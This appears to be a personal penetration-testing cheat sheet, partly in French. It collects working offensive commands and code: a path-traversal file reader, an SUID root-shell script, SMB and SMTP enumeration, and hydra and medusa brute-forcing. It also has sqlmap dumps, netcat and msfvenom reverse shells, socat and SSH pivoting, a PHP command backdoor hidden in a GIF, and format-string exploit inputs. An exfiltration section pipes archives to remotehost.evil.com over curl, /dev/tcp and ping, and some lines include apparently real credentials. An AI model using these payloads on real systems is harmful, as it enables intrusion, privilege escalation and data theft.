host='http://192.168.90.104/nomercy/windows/code.php?file=../../../../../../../../..'

while True:
    command=input("file: ")
    combined=host+command
    resp = req.get(combined)
    content = resp.text
    stripped = re.sub('<[^<]+?>', '', content)
    clean = re.sub('<?', '', stripped)
    print(clean)

```

```python
# client
#!/usr/bin/python

from socket import *
from time import *

host = "127.0.0.1"
port = int(1234)

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))

print s.recv(256)

s.close() # close socket. be nice.


```


```python
# server
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

s.bind(("0.0.0.0", 4444))
s.listen(10)

cSock, addr = s.accept()
handler(cSock, addr)

```


```python
# read file
import sys

thisdict = {}

f = open("words.txt", "r")
lines = f.readlines()
for line in lines:
        line = line.strip()
        line_sorted = "".join(sorted(line))
        # print("{} : {} : {}".format(count, line, line_sorted))
        thisdict[line_sorted] = line

```
```python
# read file
with open('passwd.txt',encoding='utf-8', mode='r') as f:
    raw_words = f.read()

for w in raw_words.split():
    w = w.strip()

```



```python
# set suid
import os; os.system('cp /bin/sh /tmp/sh');   os.system('chown root.root /tmp/sh'); os.system('chmod 4755 /tmp/sh');

```


# Generate password

    #1 /etc/passwd
    https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow

    openssl passwd -salt <xyz>  <yourpass>
        -1 : MD5 password,
        -5 : SHA256 
        -6 : SHA512 

    mkpasswd --method=SHA-512 --stdin
        --method=md5
        --method=sha-256
        --method=sha-512

    $6$bwL9Kv2faBAyJPN$zDTWRSChi/5YL7FYSr6QherkDadkK.wWrg3GS8R7N8oagIY8ufxTalKkGzbBIQB1Nga3TVAF/wnQ/uszJoFa81

    #2 Wordpress
    $P$BZ9cvCg4NZMOtHvOEhxws.wSX6/OX7. : 123456

# visudo

bttai   ALL=(ALL) NOPASSWD: ALL


# SMTP
# SMB

https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/

enum4linux 192.168.110.46
nmblookup -A 192.168.1.17
snmp-check 10.10.10.10
nbtscan 192.168.1.17
smbmap -H 192.168.110.46
smbmap -H 192.168.110.46 -u helios -p qwerty
rpcclient -U "" 10.10.10.10

smbclient -L 192.168.110.46
smbclient //192.168.110.46/helios
get file.txt

smbclient //10.10.10.9/share$
userdb=users.txt 192.168.110.11
smbclient //192.168.110.46/helios -U helios
Enter WORKGROUP\helios's password: 
Try "help" to get a list of possible commands.
smb: \> ls
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *


smbclient -I 192.168.1.26 -L -N
    
    –I — This will direct smbclient to connect with the appending IP address
    –L — This will list all the shared resources of the target machine, if available
    –N — This tells it to connect with the target machine without the password


## SMB Password Cracking

https://www.hackingarticles.in/password-crackingsmb/
hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
hydra -e nsr -u -l <username> -P passwd.txt 192.168.1.105 smb -V -f

ncrack –U /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 –p 445

medusa -h 192.168.1.118 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M smbnt
medusa -u <username> -P passwd.txt -h 192.168.1.105 -M smbnt

Metasploit

use auxiliary/scanner/smb/smb_login
msf exploit (smb_login)>set rhosts 192.168.1.118
msf exploit (smb_login)>set user_file /root/Desktop/user.txt
msf exploit (smb_login)>set pass_file /root/Desktop/pass.txt
msf exploit (smb_login)>set stop_on_success true
msf exploit (smb_login)>exploit

# NFS

showmount : liste les partages, mountables anonymement

# SMTP 

userdb=users.txt 192.168.110.11
    nmap -p25 --script smtp-enum-users  --script-args smtp-enum-users.domain=<domain>,userdb=users.txt 192.168.110.11
    
    msf6 auxiliary(scanner/smtp/smtp_enum) > show options
    Module options (auxiliary/scanner/smtp/smtp_enum):
       Name       Current Setting            Required  Description
       ----       ---------------            --------  -----------
       RHOSTS                                yes       The target host(s), range CIDR identifier,
                                                       or hosts file with syntax 'file:<path>'
       RPORT      25                         yes       The target port (TCP)
       THREADS    1                          yes       The number of concurrent threads (max one p
                                                       er host)
       UNIXONLY   true                       yes       Skip Microsoft bannered servers when testin
                                                       g unix users
       USER_FILE  /usr/share/metasploit-fra  yes       The file that contains a list of probable u
                  mework/data/wordlists/uni            sers accounts.
                  x_users.txt

    msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 192.168.110.1
    RHOSTS => 192.168.110.21
    msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE users.txt
    USER_FILE => users.txt
    msf6 auxiliary(scanner/smtp/smtp_enum) > run
    [*] 192.168.110.21:25     - 192.168.110.21:25 Banner: 220 TORMENT.localdomain ESMTP Postfix (Debian/GNU)
    [+] 192.168.110.21:25     - 192.168.110.21:25 Users found: patrick, qiu
    [*] 192.168.110.21:25     - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

    /usr/share/legion/scripts/smtp-user-enum.pl -M VRFY -U users.txt -t 192.168.110.63
    

# Base de données

## sqlmap

    sqlmap -u 'http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#'
    --cookie='PHPSESSID=0e4jfbrgd8190ig3uba7rvsip1; security=low'
    --string='First name' --dbs --level 3 -p PHPSESSID

    -- string compare between the valid pages and the invalid one 
    -- dbs is used to enumerate the database 
    -- p force the testing of the PHPSESSID variable
    sqlmap --list-tamper
    sqlmap -u "http://192.168.110.55/" --headers="X-Forwarded-For: *" --dbms=MySQL -D photoblog -T users -C login,password  --batch --dump


# SNMP (UDP 161) 

snmpwalk

# LDAP


ldapsearch -x -LLL -h 192.168.110.51 -D 'cn=admin,dc=symfonos,dc=local' -w 'qMDdyZh3cT6eeAWD' -b 'dc=symfonos,dc=local'
nmap 192.168.110.51 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"' 

# Transfert de fichiers

## with nc

    #reciever
    nc -l -p 1234 -q 1 > archive.tar.gz < /dev/null
    nc -l -p 1234 -q 1 | uncompress -c | tar xvfp -
    nc -l -p 1234  -q 1 | gunzip > asroot
    nc -l -p 1234  -q 1 | tar zxv
    nc 10.0.1.1 1234 > linpeas.sh

    #sender
    cat archive.tar.gz | nc a.b.c.d 1234
    tar cfp - /some/dir | compress -c |  nc a.b.c.d 1234
    gzip -c /tmp/asroot | nc a.b.c.d 1234
    tar czp /tmp/directory | nc a.b.c.d 1234
    nc -l -p 1234 -q 1 < linpeas.sh 

## transfer file xxd, base64
    
    xxd -p -c 36 binary
    cat binary.xxd | xxd -r -p > binary

    base64 -w 0 binary
    echo -ne f0VMRgEBAQAAAAAAAAAAAAIAAwABA... | base64 -d > binary



# Version 

    uname -a
    lsb_release -a
    cat /etc/release
    cat /etc/*release
    cat /etc/issue
    cat /etc/os-release
    hostnamectl

# Spawning a TTY Shell

    python -c 'import pty; pty.spawn("/bin/sh")'
    python3 -c 'import pty; pty.spawn("/bin/sh")'
    echo os.system('/bin/bash')
    /bin/sh -i
    perl -e 'exec "/bin/sh";'
    perl - exec "/bin/sh";
    ruby - exec "/bin/sh"
    lua - os.execute('/bin/sh')
    IRB - exec "/bin/sh"
    vi - :!bash
    vi - :set shell=/bin/bash:shell
    nmap - !sh



# knock port

    for p in 4000 5000 6000; do nmap -Pn --host-timeout 201 --max-retries 0 -p $p <victime_ip>; done
    for p in 7000 8000 9000; do nc -vz <victime_ip> $p; done


https://github.com/grongor/knock/blob/master/knock


# Display available network interfaces

    ip link show
    nmcli device status / nmcli connection show
    netstat -i
    netstat -antp | grep 1234
    netstat -lnp tcp

    ifconfig -a

# Routing table
    
    ip r

# ARP cache

    arp 
    arp -a
    arp -e
    arp -n

# Crypt - uncrypt

    https://hashes.com/en/decrypt/hash
    cyberchef : gchq.github.io
    http://rumkin.com/tools


## ROT13

```console

 tr 'A-Za-z' 'N-ZA-Mn-za-m'

```



=== Write in some sensitive file
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq

for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user


=== Server
python3 -m http.server 8888 --directory /home/kali/OSPC/Tools/


=== Check privilegessocat TCP-LISTEN:1234,reuseaddr,for

http://www.securitysift.com/download/linuxprivchecker.py
https://github.com/cervoise/linuxprivcheck
https://github.com/rebootuser

# Port forwarding 

## socat TCP redirection

    1) attacker listen on port 443 and 2222
    sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr    
    
    2) victim connect to <attacker_ip> on the port 443 and traffic redirection to the local port 22
    while true; do socat TCP4:<attacker_ip>:443 TCP4:127.0.0.1:22 ; done
    
    3) attacker connect to the port 2222 wich redirect to the remote port 22
    ssh localhost -p 2222 -i key



## SSH

    # victim's machine
    ssh-keygen -P "" -f key

    # attacker's machine
    echo $(cat key.pub) >> authorized_keys

    # attacker's machine
    ssh -N -f -L 8080:internalTarget:80 user@<victim_ip>
    ssh -N -f -L 2222:internalTarget:22 user@<victim_ip>

    # attacker's machine
    ssh -N -f -R 2222:internalTarget:22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@<attacker_ip> -i key 2>&1

    # victim's machine
    ssh -f -N kali@172.16.16.1 -R 6667:127.0.0.1:6667 -i key

    

## Meterpreter session

    portfwd add -l 3306 -p 3306 -r 172.28.128.3
    portfwd list
    portfwd flush






# Obtient a meterpreter session

    # netcat
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set lhost 192.168.0.13
    msf6 exploit(multi/handler) > set payload generic/shell_reverse_tcp
    # or
    msf6 exploit(multi/handler) > set payload linux/x86/shell_reverse_tcp
    msf6 exploit(multi/handler) > run

    nc 192.168.0.13 4444 -e /bin/sh
    
    ^Z
    Background session 1? [y/N]  y
    msf6 exploit(multi/handler) > sessions  -u 1
    msf6 exploit(multi/handler) > sessions 2

    # msfvenom binary
    msfvenom --platform linux --arch x86 --payload linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 --format elf --out rev

    msf6 > use exploit/multi/handler 
    msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST 192.168.110.1
    msf6 exploit(multi/handler) > run


    # msfvenom php

    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f raw -o rev.php
    php -f /tmp/rev.php
    curl http://<victim_ip>/rev.php

    msf6 > use exploit/multi/handler 
    msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST 192.168.110.1
    msf6 exploit(multi/handler) > run




# Escape jail

https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash

Info about the jail:

    echo $SHELL
    echo $PATH
    env
    export
    pwd


- rbash : ssh avida@192.168.110.38 -t "/bin/bash --noprofile"
- ftp : 
    -rbash-4.1$ ftp 
    ftp> !
    +rbash-4.1$ /bin/bash
- nano :
    nano -s /bin/bash
    /bin/bash
    ^T
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash
- vim
    :set shell=/bin/sh
    :shell
- lshell
    $ os.system('/bin/bash')

# ProFTPd 1.3.5

<https://www.exploit-db.com/exploits/36742>
mod_copy allows these commands : site cpfr, site cpto to be used by *unauthenticated clients*

    telnet 80.150.216.115 21
    site cpfr /etc/passwd
    350 File or directory exists, ready for destination name
    site cpto /tmp/passwd.copy
    250 Copy successful



# Bordel



==GIF backdoor file
echo 'FFD8FFEo' | xxd -r -p > test.gif
echo '<?php $c=$_GET['c']; echo `$c`; ?>' >> test.gif


GIF89a<?php
echo 'hi';

http://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru
+----------------+-----------------+----------------+---------------+
|    Command     | Displays Output | Get Output     | Get Exit Code |
+----------------+-----------------+----------------+---------------+
| system()       | Yes (as text)   | Last line only | Yes           |
| passthru()     | Yes (raw)       | No             | Yes           |
| exec()         | No              | Yes (array)    | Yes           |
| shell_exec()   | No              | Yes (string)   | No            |
| backticks (``) | No              | Yes (string)   | No            |
+----------------+-----------------+----------------+---------------+


==reverse enginneer
https://github.com/ebtaleb/peda_cheatsheet/blob/master/peda.md

cat /proc/sys/kernel/randomize_va_space

gcc pwnme.c -o pwnme -fno-stack-protector
gcc pwnme.c -o pwnme -fno-stack-protector -z execstack

msfvenom -p linux/x86/exec CMD=/bin/bash -a x86 --platform linux  -f python -b "\x00\x0a\0d"

checksec
strace, ltrace, ptrace
ltrace <binary>
objdump -d <binary> -M intel
objdump -d <binary> -M intel | grep -e "cal.*eax" --color
objdump -d agent | less -p .text
objdump -D <binary> | grep call| grep eax
00 termination 
0a carriage return
0d line feed

JMP EAX” or “CALL EAX”
gdb-peda$ asmsearch "call eax"
gdb-peda$ asmsearch "jmp esp"

gdb-peda$ find "\xff\xd4" binary

gdb-peda$ find "\xff\xe4" binary





##  Desactive ASLR

maximize the stack 

```console
mike@pegasus:~$ ulimit -s
8192
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ulimit -s
unlimited
```

== Format string vulnerability

```c

#vuln
printf(string)

#secure
printf("%s", string)

```

%x : exame stack memory
%s : read from arbitrary memory address
%n : write to abitrary memory address
%4$x ~ %x%x%x%x
%4$n ~ %x%x%x%x%n
addr1 +  addr3 + "%48871x%11$hn%8126x%12$hn"


```py

import struct

def p(x):
        return struct.pack('<L', x)

input0 = "AAAA.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x"

addr = p(0x0804a024)

addr1 = p(0x0804a024)
addr2 = p(0x0804a025)
addr3 = p(0x0804a026)
addr4 = p(0x0804a027)


input1 = addr +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.%x"
input2 = addr +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.%n"
input3 = addr +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%64x.%n"

#0xaabbccdd
input4 = addr1 + "JUNK" + addr2+ "JUNK" + addr3 + "JUNK" + addr4 +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%40x.%n%17x%n%17x%n%17x%n"

#0xdeadbeef
input5 = addr1 + "JUNK" + addr2+ "JUNK" + addr3 + "JUNK" + addr4 +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%109x.%n%207x%n%239x%n%49x%n"

#0x0806abcd
input6 = addr1 + "JUNK" + addr2+ "JUNK" + addr3 + "JUNK" + addr4 +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%75x.%n%222x%n%91x%n%258x%n"

input7 = "AAAA" + "%11$08x"
input8 = addr  + "%11$n"
input9 = addr  + "%166x%11$n"
input10 = addr1 + addr2 + addr3 + addr4 +"%98x%11$n%139x%12$n%194x%13$n%64x%14$n"


input11 = addr1 +  addr3 + "%48871x%11$hn%8126x%12$hn"


print input11

```



# Buffers overflow

https://guif.re/bo

1- Identification fuzz
2- Finding EIP : pattern_create
3- Finding JMP ESP
4- Finding bad characters
5- Injecting a shellcode


gdb-peda$ asmsearch "jmp esp"
gdb-peda$ asmsearch "call esp"
gdb-peda$ find "\xff\xd4" binary
gdb-peda$ find "\xff\xe4" binary

objdump -d tfc |grep ".plt" 


## dd

    sudo fdisk -l
    sudo dd bs=1M if=image.iso of=/dev/sdf status=progress conv=fsync





### exfiltration

<http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html>
    
```bash
tar zcf - localfolder | ssh remotehost.evil.com "cd /some/path/name; tar zxpf -"
rsync -aH localhost remotehost.evil.com:/some/path/name
tar zcf - localfolder | curl -F "data=@-" https://remotehost.evil.com/script.php

tar zcf - localfolder >/dev/tcp/remotehost.evil.com/443
tar zcf - localfolder | xxd -p >/dev/tcp/remotehost.evil.com/443
tar zcf - localfolder | base64 | dd conv=ebcdic >/dev/tcp/remotehost.evil.com/443

tar zcf - localfolder | xxd -p -c 16 | while read line; do ping -p $line -c 1 -q remotehost.evil.com; done

```
